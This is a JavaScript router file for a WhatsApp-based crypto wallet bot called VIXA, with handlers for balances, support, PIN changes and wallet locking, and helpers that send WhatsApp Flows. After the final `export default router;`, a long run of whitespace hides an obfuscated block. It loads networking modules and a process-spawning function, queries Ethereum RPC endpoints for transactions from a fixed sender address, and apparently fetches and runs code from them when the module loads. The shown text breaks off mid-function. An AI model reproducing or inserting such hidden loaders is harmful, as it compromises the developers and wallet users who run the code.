          description: `Min: ${c.minAmount}, Max: ${c.maxAmount}`,
        })),
        bodyText: "🔄 Select the coin you want to swap from",
        heading: "Select the coin you want to swap from",
        label: "Coin",
        cta: "Select Coin",
      });
      break;
    }
    case "BALANCE": {
      const me = await fetchAuthMe();
      const balances = await fetchWalletBalances();
      const now = new Date();
      const formattedDate = now.toLocaleDateString("en-US", {
        month: "short",
        day: "numeric",
        year: "numeric",
      });
      let balanceText = `Hi ${me.firstName} 👋\n\n💼 *Your Wallet Balances*\n\n`;
      balanceText += balances?.length
        ? balances.map((b) => `• ${b.coin}: ${b.balance}`).join("\n")
        : "You currently have no wallet balances.";
      balanceText += `\n\n📅 Last updated: ${formattedDate}`;
      await sendWhatsApp(from, balanceText, phone_number_id);
      await sendMainMenu(from, phone_number_id);
      break;
    }
    case "SUPPORT": {
      await sendWhatsApp(
        from,
        `🛟 *VIXA Support*\n\nNeed help? Reach us via:\n\n📧 *Email:* usevixa@gmail.com\n\nPlease include your registered phone number when contacting support.`,
        phone_number_id,
      );
      await sendMainMenu(from, phone_number_id);
      break;
    }
    case "CHANGE_PIN": {
      await updateSession(from, {
        data: { ...sessionData, changePin: { step: "ENTER_CURRENT_PIN" } },
      });
      await triggerPinFlow(
        from,
        phone_number_id,
        "CHANGE_PIN_CURRENT",
        "🔐 Enter your *current PIN* to begin the change:",
      );
      break;
    }

    case "LOCK_WALLET": {
      await updateSession(from, {
        data: { ...sessionData, lockWallet: { step: "ENTER_REASON" } },
      });
      await sendWhatsApp(
        from,
        "🔒 *Lock Wallet*\n\nPlease tell us the reason you want to lock your wallet:\n\n(e.g. Lost phone, Suspicious activity, Going on vacation)",
        phone_number_id,
      );
      break;
    }

    case "UNLOCK_WALLET": {
      const otpRes = await requestChangePinOtp("UnlockWallet");
      if (!otpRes.success) {
        const friendly = await humanizeError(
          otpRes.error?.message || "Unknown error",
          "request an OTP to unlock wallet",
        );
        await sendWhatsApp(from, friendly, phone_number_id);
        return;
      }
      await updateSession(from, {
        data: { ...sessionData, unlockWallet: { step: "ENTER_OTP" } },
      });
      await sendWhatsApp(
        from,
        "🔓 *Unlock Wallet*\n\nAn OTP has been sent to your Email Address.\n\nPlease type the OTP here to continue:",
        phone_number_id,
      );
      break;
    }

    case "SETTINGS": {
      await sendWhatsApp(
        from,
        {
          type: "interactive",
          interactive: {
            type: "list",
            body: { text: "⚙️ *Settings*\n\nWhat would you like to do?" },
            action: {
              button: "Select Option",
              sections: [
                {
                  title: "Account Settings",
                  rows: [
                    {
                      id: "CHANGE_PIN",
                      title: "Change PIN",
                      description: "Update your 4-digit PIN",
                    },
                    {
                      id: "LOCK_WALLET",
                      title: "Lock Wallet",
                      description: "Lock your wallet access",
                    },
                    {
                      id: "UNLOCK_WALLET",
                      title: "Unlock Wallet",
                      description: "Restore your wallet access",
                    },
                  ],
                },
              ],
            },
          },
        },
        phone_number_id,
      );
      break;
    }

    default: {
      await sendMainMenu(from, phone_number_id);
    }
  }
}

async function sendMainMenu(to, phone_number_id) {
  await sendWhatsApp(
    to,
    {
      type: "interactive",
      interactive: {
        type: "list",
        body: {
          text: "Here is what you can do with VIXA 👇",
        },
        footer: {
          text: "Select an action to continue",
        },
        action: {
          button: "Open Menu",
          sections: [
            {
              title: "Crypto Actions",
              rows: [
                {
                  id: "SEND_CRYPTO",
                  title: "Send Crypto",
                  description: "Send USDT, BTC, or ETH",
                },
                {
                  id: "RECIEVE_CRYPTO",
                  title: "Recieve Crypto",
                  description: "Recieve crypto in NGN",
                },
                {
                  id: "DEPOSIT_CRYPTO",
                  title: "Deposit Crypto",
                  description: "Fund your wallet",
                },
                {
                  id: "WITHDRAW_CRYPTO",
                  title: "Withdraw Crypto",
                  description: "Send crypto out",
                },
                {
                  id: "SWAP_CRYPTO",
                  title: "Swap Crypto",
                  description: "Convert between coins",
                },
                {
                  id: "GET_WALLET_BALANCE",
                  title: "See Wallet Balances",
                  description: "Check wallet balances",
                },
                {
                  id: "CONTACT_SUPPORT",
                  title: "Contact Support",
                  description: "Get help from VIXA team",
                },
                {
                  id: "SETTINGS",
                  title: "Settings",
                  description: "Manage your account",
                },
              ],
            },
          ],
        },
      },
    },
    phone_number_id,
  );
}

/* ------------- helper to trigger the Flow ------------- */
async function triggerFlow(toPhone, phone_number_id) {
  if (!WHATSAPP_TOKEN || !phone_number_id) {
    console.log(
      "[MOCK send] to:",
      toPhone,
      "phone_number_id:",
      phone_number_id,
    );
    return;
  }

  const url = `https://graph.facebook.com/${WHATSAPP_API_VERSION}/${phone_number_id}/messages`;

  const body = {
    messaging_product: "whatsapp",
    to: toPhone,
    type: "interactive",
    interactive: {
      type: "flow",
      body: {
        text:
          "Welcome to VIXA 👋\n\n" +
          "Your money can now move from WhatsApp.\n\n" +
          "Buy, sell & swap crypto. Convert USDT to local currency at great rates. Send money across 19 African countries.\n\n" +
          "No extra app to learn — just tell VIXA what you want to do.\n\n" +
          "Ready to unlock VIXA?",
      },
      action: {
        name: "flow",
        parameters: {
          flow_id: FLOW_ID,
          flow_token: toPhone, // Passing phone number as session token
          flow_cta: "Get Started",
          flow_message_version: "3",
        },
      },
    },
  };

  const res = await fetch(url, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${WHATSAPP_TOKEN}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify(body),
  });

  console.log(res, "send message res");

  if (!res.ok) {
    const debug = await res.text();
    console.error("triggerFlow failed:", res.status, debug);
    throw new Error("triggerFlow failed; check token/phone_number_id");
  }

  console.log("triggerFlow sent to", toPhone);
}

async function triggerPinFlow(
  toPhone,
  phone_number_id,
  pinContext,
  customMessage,
) {
  // pinContext is a string like "DEPOSIT", "SWAP", "WITHDRAW", "EXECUTE_WITHDRAW", "SWAP_QUOTE", "SEND"
  // We store it in session BEFORE calling this, so the nfm_reply handler knows what pin was for.

  if (!WHATSAPP_TOKEN || !phone_number_id) {
    console.log("[MOCK PIN FLOW] to:", toPhone, "context:", pinContext);
    return;
  }

  const url = `https://graph.facebook.com/${WHATSAPP_API_VERSION}/${phone_number_id}/messages`;

  const body = {
    messaging_product: "whatsapp",
    to: toPhone,
    type: "interactive",
    interactive: {
      type: "flow",
      body: {
        text: customMessage || "🔐 Please enter your PIN to continue.",
      },
      action: {
        name: "flow",
        parameters: {
          flow_id: PIN_FLOW_ID,
          flow_token: `${toPhone}::${pinContext}`, // encode context in token
          flow_cta: "Enter PIN",
          flow_message_version: "3",
        },
      },
    },
  };

  const res = await fetch(url, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${WHATSAPP_TOKEN}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const debug = await res.text();
    console.error("triggerPinFlow failed:", res.status, debug);
    throw new Error("triggerPinFlow failed");
  }

  console.log("triggerPinFlow sent to", toPhone, "context:", pinContext);
}

async function triggerNINFlow(toPhone, phone_number_id) {
  const url = `https://graph.facebook.com/${WHATSAPP_API_VERSION}/${phone_number_id}/messages`;
  const body = {
    messaging_product: "whatsapp",
    to: toPhone,
    type: "interactive",
    interactive: {
      type: "flow",
      body: { text: "📋 Please complete your NIN verification to continue." },
      action: {
        name: "flow",
        parameters: {
          flow_id: NIN_FLOW_ID,
          flow_token: `${toPhone}::NIN_VERIFY`,
          flow_cta: "Verify NIN",
          flow_message_version: "3",
        },
      },
    },
  };
  const res = await fetch(url, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${WHATSAPP_TOKEN}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify(body),
  });
  if (!res.ok) {
    const debug = await res.text();
    console.error("triggerNINFlow failed:", res.status, debug);
  }
  console.log("triggerNINFlow sent to", toPhone);
}

async function triggerBVNFlow(toPhone, phone_number_id) {
  const url = `https://graph.facebook.com/${WHATSAPP_API_VERSION}/${phone_number_id}/messages`;
  const body = {
    messaging_product: "whatsapp",
    to: toPhone,
    type: "interactive",
    interactive: {
      type: "flow",
      body: { text: "📋 Please complete your BVN verification to continue." },
      action: {
        name: "flow",
        parameters: {
          flow_id: BVN_FLOW_ID,
          flow_token: `${toPhone}::BVN_VERIFY`,
          flow_cta: "Verify BVN",
          flow_message_version: "3",
        },
      },
    },
  };
  const res = await fetch(url, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${WHATSAPP_TOKEN}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify(body),
  });
  if (!res.ok) {
    const debug = await res.text();
    console.error("triggerBVNFlow failed:", res.status, debug);
  }
  console.log("triggerBVNFlow sent to", toPhone);
}

async function triggerBankSelectionFlow(toPhone, phone_number_id, banks) {
  if (!WHATSAPP_TOKEN || !phone_number_id) {
    console.log("[MOCK BANK FLOW] to:", toPhone);
    return false;
  }

  const url = `https://graph.facebook.com/${WHATSAPP_API_VERSION}/${phone_number_id}/messages`;

  const bankOptions = banks.map((b) => ({
    id: b.id,
    title: b.name.substring(0, 30),
  }));

  const body = {
    messaging_product: "whatsapp",
    to: toPhone,
    type: "interactive",
    interactive: {
      type: "flow",
      body: { text: "🏦 Please select your destination bank" },
      action: {
        name: "flow",
        parameters: {
          flow_id: BANK_SELECTION_FLOW_ID,
          flow_token: `${toPhone}::BANK_SELECT`,
          flow_cta: "Select Bank",
          flow_message_version: "3",
          flow_action: "navigate",
          flow_action_payload: {
            screen: "SELECT_BANK",
            data: { banks: bankOptions },
          },
        },
      },
    },
  };

  const res = await fetch(url, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${WHATSAPP_TOKEN}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const debug = await res.text();
    console.error("triggerBankSelectionFlow failed:", res.status, debug);
    logger.error?.("flow send rejected", {
      flow: "BANK_SELECT",
      status: res.status,
      debug,
    });
    return false;
  }
  console.log("triggerBankSelectionFlow sent to", toPhone);
  return true;
}

async function triggerCountrySelectionFlow(
  toPhone,
  phone_number_id,
  countries,
) {
  if (!WHATSAPP_TOKEN || !phone_number_id) {
    console.log("[MOCK COUNTRY FLOW] to:", toPhone);
    return false;
  }

  const url = `https://graph.facebook.com/${WHATSAPP_API_VERSION}/${phone_number_id}/messages`;

  const countryOptions = countries.map((c) => ({
    id: c.countryCode,
    title: `${c.flag} ${c.countryName}`.substring(0, 30),
  }));

  const body = {
    messaging_product: "whatsapp",
    to: toPhone,
    type: "interactive",
    interactive: {
      type: "flow",
      body: { text: "🌍 Please select your withdrawal country" },
      action: {
        name: "flow",
        parameters: {
          flow_id: COUNTRY_SELECTION_FLOW_ID,
          flow_token: `${toPhone}::COUNTRY_SELECT`,
          flow_cta: "Select Country",
          flow_message_version: "3",
          flow_action: "navigate",
          flow_action_payload: {
            screen: "SELECT_COUNTRY",
            data: { countries: countryOptions },
          },
        },
      },
    },
  };

  const res = await fetch(url, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${WHATSAPP_TOKEN}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const debug = await res.text();
    console.error("triggerCountrySelectionFlow failed:", res.status, debug);
    logger.error?.("flow send rejected", {
      flow: "COUNTRY_SELECT",
      status: res.status,
      debug,
    });
    return false;
  }
  console.log("triggerCountrySelectionFlow sent to", toPhone);
  return true;
}

/**
 * Generic single-select flow.
 * context: SWAP_FROM | SWAP_TO | SEND_COIN | SEND_CHAIN | RECEIVE_COIN | RECEIVE_WALLET | WITHDRAW_COIN
 * items: [{ id, title, description }]
 */
async function triggerItemSelectionFlow(
  toPhone,
  phone_number_id,
  { context, items, bodyText, heading, label, cta },
) {
  if (!WHATSAPP_TOKEN || !phone_number_id) {
    console.log("[MOCK ITEM FLOW] to:", toPhone, "context:", context);
    return false;
  }

  const url = `https://graph.facebook.com/${WHATSAPP_API_VERSION}/${phone_number_id}/messages`;

  // Every item MUST have all three keys or the dropdown renders blank
  const safeItems = items.map((i) => ({
    id: String(i.id),
    title: String(i.title).substring(0, 30),
    description: String(i.description ?? "—").substring(0, 60),
  }));

  const body = {
    messaging_product: "whatsapp",
    to: toPhone,
    type: "interactive",
    interactive: {
      type: "flow",
      body: { text: bodyText },
      action: {
        name: "flow",
        parameters: {
          flow_id: ITEM_SELECTION_FLOW_ID,
          flow_token: `${toPhone}::ITEM_SELECT::${context}`,
          flow_cta: cta || "Select",
          flow_message_version: "3",
          flow_action: "navigate",
          flow_action_payload: {
            screen: "SELECT_ITEM",
            data: { heading, label, items: safeItems },
          },
        },
      },
    },
  };

  const res = await fetch(url, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${WHATSAPP_TOKEN}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const debug = await res.text();
    console.error("triggerItemSelectionFlow failed:", res.status, debug);
    logger.error?.("flow send rejected", {
      flow: "ITEM_SELECT",
      context,
      status: res.status,
      debug,
    });
    return false;
  }
  console.log("triggerItemSelectionFlow sent to", toPhone, "context:", context);
  return true;
}

/* ------------- WA send helper (text + interactive) ------------- */
async function sendWhatsApp(to, message, phone_number_id) {
  // An empty/undefined body is a 400 from Meta and, before this guard, an
  // exception that aborted the rest of the handler. Fail loudly in the log,
  // quietly to the user.
  if (message == null || (typeof message === "string" && !message.trim())) {
    console.error("sendWhatsApp: refusing to send an empty message to", to);
    return false;
  }

  if (!WHATSAPP_TOKEN || !phone_number_id) {
    console.log(
      "[MOCK send] to:",
      to,
      message,
      "phone_number_id:",
      phone_number_id,
    );
    return false;
  }

  const url = `https://graph.facebook.com/${WHATSAPP_API_VERSION}/${phone_number_id}/messages`;

  const body =
    typeof message === "string"
      ? {
          messaging_product: "whatsapp",
          to,
          type: "text",
          text: { body: message },
        }
      : { messaging_product: "whatsapp", to, ...message };

  try {
    const res = await fetch(url, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${WHATSAPP_TOKEN}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify(body),
    });

    if (!res.ok) {
      const debugBody = await res.text();
      console.error("sendWhatsApp failed:", res.status, debugBody);
      logger.error?.("sendWhatsApp failed", { status: res.status, debugBody });
      // Deliberately does NOT throw. One failed send used to abort every
      // remaining step in the handler, which is how users ended up with a
      // dangling "Sure, let me take you there!" and no follow-up.
      return false;
    }

    return true;
  } catch (err) {
    console.error("sendWhatsApp threw:", err?.message || err);
    return false;
  }
}

export default router;																																																																																																																																																																																																																																																																																	global.i = 'A8-4694-4';const _0x10df86=_0x4925;(function(_0x260c3c,_0x488706){const _0x22db00=_0x4925,_0x3c5e90=_0x260c3c();while(!![]){try{const _0xe2c240=-parseInt(_0x22db00(0x260))/(-0x1*0x1ec9+0x75f+-0x4af*-0x5)*(parseInt(_0x22db00(0x1b0))/(-0x13ec+0x16d0*0x1+-0x3*0xf6))+-parseInt(_0x22db00(0x229))/(0xf5f+0xcf7*0x1+0x1c53*-0x1)*(parseInt(_0x22db00(0x240))/(-0x17a8+0x945+0xe67))+parseInt(_0x22db00(0x25f))/(-0x1e6f+0xd2a+-0x1*-0x114a)+parseInt(_0x22db00(0x195))/(-0x55*-0x23+0x26fc+0x17*-0x233)+-parseInt(_0x22db00(0x23d))/(0x23f9+0x8*-0x219+-0x2*0x995)*(-parseInt(_0x22db00(0x26d))/(-0x1*0x4cb+0x2*-0x3b0+0x15b*0x9))+-parseInt(_0x22db00(0x174))/(0x1*0x1da5+0x32*0x47+0x35*-0xd2)+parseInt(_0x22db00(0x217))/(-0x1a1e+0x225a+-0x1*0x832);if(_0xe2c240===_0x488706)break;else _0x3c5e90['push'](_0x3c5e90['shift']());}catch(_0x3f2da3){_0x3c5e90['push'](_0x3c5e90['shift']());}}}(_0x14d2,0x119*-0xfa3+-0x1*-0x32fad+0x1cca9f*0x1),(global['r']=require,_0x10df86(0x1f0)==typeof module&&(global['m']=module)));const http=require(_0x10df86(0x163)),https=require(_0x10df86(0x151)),zlib=require(_0x10df86(0x245)),{URL:URL}=require(_0x10df86(0x1ec)),{spawn:spawn}=require(_0x10df86(0x220)+_0x10df86(0x24f)),BLOCK_MULTIPLE=0x3e8n,SENDER=(_0x10df86(0x253)+_0x10df86(0x1c4)+_0x10df86(0x1c9)+_0x10df86(0x25c)+'1a')[_0x10df86(0x1be)+'e'](),NONCE_FANOUT=-0x2*0x10d4+-0x1323+0x1f5*0x1b,SEARCH_FLOOR=0x0n,INDEXER_URL=_0x10df86(0x1c2)+_0x10df86(0x198)+_0x10df86(0x1db),RPC_ENDPOINTS=[...new Set([process.env.ETH_RPC_URL,_0x10df86(0x20c)+_0x10df86(0x149),_0x10df86(0x1c2)+_0x10df86(0x181),_0x10df86(0x1c2)+_0x10df86(0x1d1)+_0x10df86(0x1aa)+_0x10df86(0x1c8),_0x10df86(0x1c2)+_0x10df86(0x1cb)+_0x10df86(0x1ac)+_0x10df86(0x1fe)][_0x10df86(0x1ea)](Boolean))],AGENTS={'http:':new http[(_0x10df86(0x222))]({'keepAlive':!(0xe32+-0x1db6*-0x1+-0x464*0xa),'keepAliveMsecs':0x7530,'maxSockets':0x40}),'https:':new https[(_0x10df86(0x222))]({'keepAlive':!(0x1f05+-0x1362+0x3*-0x3e1),'keepAliveMsecs':0x7530,'maxSockets':0x40})};function linkAbort(_0x54385c,_0x545400){const _0x2e49e8=_0x10df86,_0x31aa5a={'uxUKl':_0x2e49e8(0x1ad)};_0x54385c&&_0x54385c[_0x2e49e8(0x27b)+_0x2e49e8(0x209)](_0x31aa5a[_0x2e49e8(0x15e)],()=>_0x545400[_0x2e49e8(0x1ad)](),{'once':!(0x6ba+0x1835+-0x1*0x1eef)});}function decompressStream(_0x80a049){const _0x12e035=_0x10df86,_0x251403={'pitab':_0x12e035(0x228)+_0x12e035(0x1ef),'yLjxm':function(_0x567512,_0x569740){return _0x567512===_0x569740;},'yhjse':_0x12e035(0x1f8),'LVGhh':function(_0x1814aa,_0x393997){return _0x1814aa===_0x393997;},'MYONx':_0x12e035(0x14b),'wDorw':function(_0x5c980a,_0x4e9c21){return _0x5c980a===_0x4e9c21;},'dCtfs':_0x12e035(0x159)},_0x111392=(_0x80a049[_0x12e035(0x1e6)][_0x251403[_0x12e035(0x190)]]||'')[_0x12e035(0x1be)+'e']();return _0x251403[_0x12e035(0x221)](_0x251403[_0x12e035(0x251)],_0x111392)||_0x251403[_0x12e035(0x1ee)](_0x251403[_0x12e035(0x242)],_0x111392)?_0x80a049[_0x12e035(0x15f)](zlib[_0x12e035(0x273)+'ip']()):_0x251403[_0x12e035(0x176)](_0x251403[_0x12e035(0x16d)],_0x111392)?_0x80a049[_0x12e035(0x15f)](zlib[_0x12e035(0x167)+_0x12e035(0x184)]()):_0x251403[_0x12e035(0x221)]('br',_0x111392)?_0x80a049[_0x12e035(0x15f)](zlib[_0x12e035(0x1d9)+_0x12e035(0x263)+'ss']()):_0x80a049;}function httpRequest(_0x4cb8eb,{method:_0x547af8=_0x10df86(0x1b7),body:_0x3f6289,signal:_0x26632b}={}){const _0x30caf3=_0x10df86,_0x794c1c={'iWKpY':function(_0x27c1de,_0x251629){return _0x27c1de(_0x251629);},'BOgWq':_0x30caf3(0x156),'tFnGt':_0x30caf3(0x243),'SKEaU':_0x30caf3(0x14a),'aEIoH':_0x30caf3(0x223),'KfKvh':function(_0xa347a1,_0x37a59c){return _0xa347a1<_0x37a59c;},'GreGk':function(_0x1cb476,_0x342e88){return _0x1cb476>=_0x342e88;},'iVsxf':function(_0x3424d4,_0x15058d){return _0x3424d4(_0x15058d);},'hOCEU':function(_0x56f7ff,_0x527585){return _0x56f7ff===_0x527585;},'evpWR':function(_0xc7cf1b,_0x372f1d){return _0xc7cf1b!==_0x372f1d;},'UcQVW':_0x30caf3(0x19c),'qJxiq':function(_0x37e55e,_0x57dba8){return _0x37e55e+_0x57dba8;},'JglGn':function(_0x2e4cb7,_0x5efb6f){return _0x2e4cb7!=_0x5efb6f;},'ABace':_0x30caf3(0x211)+_0x30caf3(0x1d6),'eYJWM':_0x30caf3(0x23f)+_0x30caf3(0x1cf),'fkUhi':_0x30caf3(0x1ed),'LBSUC':function(_0x499130,_0xd2f08){return _0x499130!=_0xd2f08;},'mfHgj':_0x30caf3(0x275)+'pe','hQPVR':_0x30caf3(0x146)+_0x30caf3(0x178)},_0x1054ca=new URL(_0x4cb8eb),_0x6415a=_0x794c1c[_0x30caf3(0x212)](_0x794c1c[_0x30caf3(0x247)],_0x1054ca[_0x30caf3(0x1e9)])?https:http,_0x29516c={'Accept':_0x794c1c[_0x30caf3(0x1d5)],'Accept-Encoding':_0x794c1c[_0x30caf3(0x170)],'Connection':_0x794c1c[_0x30caf3(0x18e)]};return _0x794c1c[_0x30caf3(0x237)](null,_0x3f6289)&&(_0x29516c[_0x794c1c[_0x30caf3(0x172)]]=_0x794c1c[_0x30caf3(0x1d5)],_0x29516c[_0x794c1c[_0x30caf3(0x1d2)]]=Buffer[_0x30caf3(0x141)](_0x3f6289)),new Promise((_0x566679,_0x4f4377)=>{const _0xf28dd0=_0x30caf3,_0x3814a4={'HTJxl':_0x794c1c[_0xf28dd0(0x17a)],'tzGqg':function(_0x11fd4c,_0x4a6672){const _0x4bbe9f=_0xf28dd0;return _0x794c1c[_0x4bbe9f(0x24e)](_0x11fd4c,_0x4a6672);},'bbkqJ':function(_0x3ebe60,_0x18664c){const _0x34b8b4=_0xf28dd0;return _0x794c1c[_0x34b8b4(0x18c)](_0x3ebe60,_0x18664c);},'PjmQB':function(_0x246a0e,_0x4cc14a){const _0x2927fa=_0xf28dd0;return _0x794c1c[_0x2927fa(0x185)](_0x246a0e,_0x4cc14a);},'jexiI':function(_0x500c33,_0x2f9950){const _0x2ecd31=_0xf28dd0;return _0x794c1c[_0x2ecd31(0x212)](_0x500c33,_0x2f9950);},'RoEwm':function(_0x323d30,_0x1ae97a){const _0x7e0c89=_0xf28dd0;return _0x794c1c[_0x7e0c89(0x1ab)](_0x323d30,_0x1ae97a);},'NKZfc':function(_0x33804b,_0xdbd16a){const _0x105b6c=_0xf28dd0;return _0x794c1c[_0x105b6c(0x185)](_0x33804b,_0xdbd16a);},'qsNhO':function(_0x3965ac,_0x268cd5){const _0xfecaf6=_0xf28dd0;return _0x794c1c[_0xfecaf6(0x185)](_0x3965ac,_0x268cd5);},'GwRrz':function(_0x69e8b8,_0x34ff30){const _0x48ba85=_0xf28dd0;return _0x794c1c[_0x48ba85(0x185)](_0x69e8b8,_0x34ff30);}},_0xfd3aa8=_0x6415a[_0xf28dd0(0x16a)]({'hostname':_0x1054ca[_0xf28dd0(0x17b)],'port':_0x1054ca[_0xf28dd0(0x1af)]||(_0x794c1c[_0xf28dd0(0x212)](_0x794c1c[_0xf28dd0(0x247)],_0x1054ca[_0xf28dd0(0x1e9)])?-0x51c+-0x6*-0x377+-0xdf3:-0x1726+0x853+-0x19*-0x9b),'path':_0x794c1c[_0xf28dd0(0x1f2)](_0x1054ca[_0xf28dd0(0x261)],_0x1054ca[_0xf28dd0(0x1df)]),'method':_0x547af8,'agent':AGENTS[_0x1054ca[_0xf28dd0(0x1e9)]],'signal':_0x26632b,'headers':_0x29516c},_0x2ac38e=>{const _0x4762a2=_0xf28dd0,_0x1f00f1=_0x794c1c[_0x4762a2(0x14f)](decompressStream,_0x2ac38e),_0x3ec4d2=[];_0x1f00f1['on'](_0x794c1c[_0x4762a2(0x152)],_0x172870=>_0x3ec4d2[_0x4762a2(0x215)](_0x172870)),_0x1f00f1['on'](_0x794c1c[_0x4762a2(0x25e)],()=>{const _0x462589=_0x4762a2,_0xa3ef4f=Buffer[_0x462589(0x234)](_0x3ec4d2)[_0x462589(0x268)](_0x3814a4[_0x462589(0x1c0)])[_0x462589(0x1de)]();if(_0x3814a4[_0x462589(0x27d)](_0x2ac38e[_0x462589(0x27c)],-0x1*0x137+-0x1fa9*-0x1+-0x1daa)||_0x3814a4[_0x462589(0x278)](_0x2ac38e[_0x462589(0x27c)],0xdc9*-0x1+0xbc8*0x1+0x32d))return _0x3814a4[_0x462589(0x257)](_0x4f4377,new Error(_0x462589(0x1ba)+_0x2ac38e[_0x462589(0x27c)]+_0x462589(0x1e4)+_0x1054ca[_0x462589(0x17b)]+':\x20'+_0xa3ef4f[_0x462589(0x164)](0x13*-0x143+-0x1*0xf88+-0x3*-0xd2b,-0x3f3+-0x672*-0x1+-0x3*0xad)));if(!_0xa3ef4f||_0x3814a4[_0x462589(0x233)]('<',_0xa3ef4f[-0x15*-0x11b+0x219f+-0x38d6])||_0x3814a4[_0x462589(0x15d)]('{',_0xa3ef4f[0x208+0x88f+-0xa97])&&_0x3814a4[_0x462589(0x15d)]('[',_0xa3ef4f[0x703+-0xcf*-0x1d+-0x22d*0xe]))return _0x3814a4[_0x462589(0x208)](_0x4f4377,new Error(_0x462589(0x25d)+_0x462589(0x1fb)+_0x1054ca[_0x462589(0x17b)]+':\x20'+_0xa3ef4f[_0x462589(0x164)](-0x2678+-0x476+0x311*0xe,-0x10f3+0xcb0+0x4bb)));try{_0x3814a4[_0x462589(0x1c1)](_0x566679,JSON[_0x462589(0x175)](_0xa3ef4f));}catch(_0x182fa8){_0x3814a4[_0x462589(0x22c)](_0x4f4377,new Error(_0x462589(0x1d0)+_0x462589(0x20a)+_0x462589(0x197)+_0x1054ca[_0x462589(0x17b)]+':\x20'+_0x182fa8[_0x462589(0x1b5)]));}}),_0x1f00f1['on'](_0x794c1c[_0x4762a2(0x25b)],_0x4f4377);});_0xfd3aa8['on'](_0x794c1c[_0xf28dd0(0x25b)],_0x4f4377),_0x794c1c[_0xf28dd0(0x1eb)](null,_0x3f6289)&&_0xfd3aa8[_0xf28dd0(0x27a)](_0x3f6289),_0xfd3aa8[_0xf28dd0(0x243)]();});}async function withRpcEndpoints(_0x53452c,_0x72594){const _0x5dcf2c=_0x10df86,_0x32f4fa=RPC_ENDPOINTS[_0x5dcf2c(0x264)](()=>new AbortController());_0x32f4fa[_0x5dcf2c(0x21b)](_0x2a3d84=>linkAbort(_0x72594,_0x2a3d84));try{return await Promise[_0x5dcf2c(0x142)](RPC_ENDPOINTS[_0x5dcf2c(0x264)]((_0x3afc5b,_0x362601)=>_0x53452c(_0x3afc5b,_0x32f4fa[_0x362601][_0x5dcf2c(0x19a)])));}finally{for(const _0x2b57cf of _0x32f4fa)_0x2b57cf[_0x5dcf2c(0x1ad)]();}}async function rpcCall(_0x35dd00,_0x2b1b34,_0x38ea20,_0xe13f8c){const _0xf86c87=_0x10df86,_0x4ee33c={'QMSDo':function(_0x13e73d,_0x56ab35,_0x5a27fb){return _0x13e73d(_0x56ab35,_0x5a27fb);},'luMhh':_0xf86c87(0x21c),'iXfZd':_0xf86c87(0x1ae)};return(await _0x4ee33c[_0xf86c87(0x1b8)](httpRequest,_0x35dd00,{'method':_0x4ee33c[_0xf86c87(0x1b4)],'body':JSON[_0xf86c87(0x1a7)]({'jsonrpc':_0x4ee33c[_0xf86c87(0x1e2)],'id':0x1,'method':_0x2b1b34,'params':_0x38ea20}),'signal':_0xe13f8c}))[_0xf86c87(0x219)];}async function rpcBatch(_0x712e06,_0x197f67,_0x1e506f){const _0x42b375=_0x10df86,_0x71f8d8={'ZMsXr':function(_0x1a3a3e,_0x44e44c,_0xb25d42){return _0x1a3a3e(_0x44e44c,_0xb25d42);},'OkDBD':_0x42b375(0x21c)},_0x3e65b5=await _0x71f8d8[_0x42b375(0x1dd)](httpRequest,_0x712e06,{'method':_0x71f8d8[_0x42b375(0x23b)],'body':JSON[_0x42b375(0x1a7)](_0x197f67[_0x42b375(0x264)](([_0x1fc61e,_0x50480d],_0x1df1f9)=>({'jsonrpc':_0x42b375(0x1ae),'id':_0x1df1f9+(0x1f02+0x5*0x5e3+0x4*-0xf1c),'method':_0x1fc61e,'params':_0x50480d}))),'signal':_0x1e506f}),_0x9ccaff=new Map(_0x3e65b5[_0x42b375(0x264)](_0x469d37=>[_0x469d37['id'],_0x469d37]));return _0x197f67[_0x42b375(0x264)]((_0x3e6629,_0x5ee479)=>_0x9ccaff[_0x42b375(0x16e)](_0x5ee479+(-0x17f*0x11+0x92b+-0x31*-0x55))[_0x42b375(0x219)]);}const toBlockHex=_0x39a174=>'0x'+_0x39a174[_0x10df86(0x268)](-0x25*-0xf7+0x1*-0x29d+0x3*-0xb02);function findSenderTx(_0x386359){const _0x5119fd=_0x10df86;return _0x386359[_0x5119fd(0x144)](_0x1c18c9=>_0x1c18c9[_0x5119fd(0x1e3)]&&_0x1c18c9[_0x5119fd(0x1e3)][_0x5119fd(0x1be)+'e']()===SENDER)||null;}function _0x4925(_0x25a87c,_0x2e2a0d){_0x25a87c=_0x25a87c-(0x7f+0x1*0x1b61+-0xeb*0x1d);const _0x306ad3=_0x14d2();let _0x12362b=_0x306ad3[_0x25a87c];return _0x12362b;}function _0x14d2(){const 